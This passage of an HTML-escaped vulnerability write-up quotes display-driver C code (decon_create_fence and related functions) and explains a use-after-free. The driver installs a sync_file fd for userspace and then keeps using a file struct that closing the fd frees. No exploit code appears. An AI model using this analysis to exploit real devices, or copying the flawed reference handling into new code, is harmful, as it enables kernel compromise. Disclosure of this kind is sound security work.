class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; regs&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;retire_fence &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;=&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;dma_fence_get&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;sync_file&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;fence&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c20\"&gt;#endif&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;[...]&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;return&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;ret&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c0 vdnyYxSRCi-c33\"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8\"&gt;&lt;span&gt;In this case, &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;decon_set_win_config&lt;/span&gt;&lt;span&gt;&amp;nbsp;acquires the &lt;/span&gt;&lt;span&gt;fd&lt;/span&gt;&lt;span&gt;&amp;nbsp;for &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;retire_fence&lt;/span&gt;&lt;span&gt;&amp;nbsp;in &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;decon_create_fence&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.1cdd8ca32332a13a24b96424b52e329a1e3820d4\"&gt;&lt;/a&gt;&lt;a id=\"t.18\"&gt;&lt;/a&gt;&lt;table class=\"vdnyYxSRCi-c23\"&gt;&lt;tr class=\"vdnyYxSRCi-c19\"&gt;&lt;td class=\"vdnyYxSRCi-c10\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;int&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;decon_create_fence&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;struct&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;decon_device &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;*&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;decon&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;struct&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;sync_file &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;**&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;sync_file&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;struct&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;dma_fence &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;*&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;fence&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;int&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;fd &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;=&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;-&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;EMFILE&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; fence &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;=&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;kzalloc&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;sizeof&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(*&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;fence&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;),&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;GFP_KERNEL&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;if&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(!&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;fence&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;return&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;-&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;ENOMEM&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; dma_fence_init&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;fence&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;&amp;amp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;decon_fence_ops&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;&amp;amp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;decon&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;fence&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;.&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;lock&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;decon&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;fence&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;.&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;context&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;atomic_inc_return&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&amp;amp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;decon&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;fence&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;.&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;timeline&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;));&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;*&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;sync_file &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;=&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;sync_file_create&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;fence&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; dma_fence_put&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;fence&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;if&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(!(*&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;sync_file&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;))&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; decon_err&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c18\"&gt;&amp;quot;%s: failed to create sync file\\n&amp;quot;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;__func__&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;return&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;-&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;ENOMEM&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c9\"&gt;fd &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0 vdnyYxSRCi-c9\"&gt;=&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c9\"&gt;&amp;nbsp;decon_get_valid_fd&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0 vdnyYxSRCi-c9\"&gt;();&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;if&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;fd &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;&amp;lt;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c13\"&gt;0&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;)&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; decon_err&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c18\"&gt;&amp;quot;%s: failed to get unused fd\\n&amp;quot;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;__func__&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; fput&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;((*&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;sync_file&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;)-&amp;gt;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;file&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;return&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;fd&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8\"&gt;&lt;span&gt;The function then calls &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;fd_install(win_data-&amp;gt;retire_fence, sync_file-&amp;gt;file)&lt;/span&gt;&lt;span&gt;&amp;nbsp;which means that userspace can now access the fd. When &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;fd_install&lt;/span&gt;&lt;span&gt;&amp;nbsp;is called, another reference is not taken on the file so when userspace calls &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;close(fd)&lt;/span&gt;&lt;span&gt;, the only reference on the file is dropped and the file struct is freed. The issue is that after calling &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;fd_install&lt;/span&gt;&lt;span&gt;&amp;nbsp;the function then calls &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;decon_create_release_fences(decon, win_data, sync_file)&lt;/span&gt;&lt;span&gt;&amp;nbsp;with the same &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;sync_file&lt;/span&gt;&lt;span&gt;&amp;nbsp;that contains the pointer to the freed file struct.&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.07bbc43ea1d81ec2c0dcdfead664a1f6cc977475\"&gt;&lt;/a&gt;&lt;a id=\"t.19\"&gt;&lt;/a&gt;&lt;table class=\"vdnyYxSRCi-c23\"&gt;&lt;tr class=\"vdnyYxSRCi-c19\"&gt;&lt;td class=\"vdnyYxSRCi-c10\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;void&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;decon_create_release_fences&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;struct&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;decon_device &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;*&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;decon&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;struct&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;decon_win_config_data &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;*&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;win_data&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;struct&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;sync_file &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;*&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;sync_file&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;int&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;i &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;=&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c13\"&gt;0&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;for&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;i &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;=&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c13\"&gt;0&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;i &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;&amp;lt;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;decon&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;dt&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;.&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;max_win&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;i&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;++)&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;int&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;state &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;=&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;win_data&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;-&amp;gt;&lt;/span&gt;&lt;span 